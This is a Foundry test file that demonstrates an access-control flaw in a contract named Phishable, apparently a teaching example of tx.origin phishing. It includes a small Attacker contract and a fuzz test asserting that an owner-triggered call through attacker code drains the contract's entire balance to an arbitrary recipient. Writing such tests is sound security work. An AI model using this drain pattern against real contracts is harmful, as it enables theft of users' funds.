
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Phishable} from "../src/Phishable.sol";

contract Attacker {
    function attack(Phishable target, address payable recipient) public {
        target.withdrawAll(recipient);
    }
}

contract TestAccessControlPhishable is Test {
    Phishable phishable;
    address owner;
    Attacker attackerTemplate;

    function setUp() public {
        owner = makeAddr("owner");
        phishable = new Phishable(owner);
        attackerTemplate = new Attacker();
    }

    function test_highlightArbitraryUserCanAccess(address caller, address recipient) public {
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        vm.assume(caller != owner);

        vm.assume(recipient != address(0));
        vm.assume(recipient != address(this));
        vm.assume(recipient != address(vm));
        vm.assume(recipient != 0x000000000000000000636F6e736F6c652e6c6f67);
        vm.assume(recipient != caller);
        vm.assume(recipient != owner);
        vm.assume(recipient != address(phishable));
        vm.assume(recipient != address(attackerTemplate));

        uint256 amount = 1 ether;
        vm.deal(address(phishable), amount);

        vm.etch(caller, address(attackerTemplate).code);

        uint256 initialRecipientBalance = recipient.balance;
        uint256 initialContractBalance = address(phishable).balance;

        vm.prank(owner);
        Attacker(caller).attack(phishable, payable(recipient));

        assertEq(recipient.balance, initialRecipientBalance + initialContractBalance);
        assertEq(address(phishable).balance, 0);
    }
}
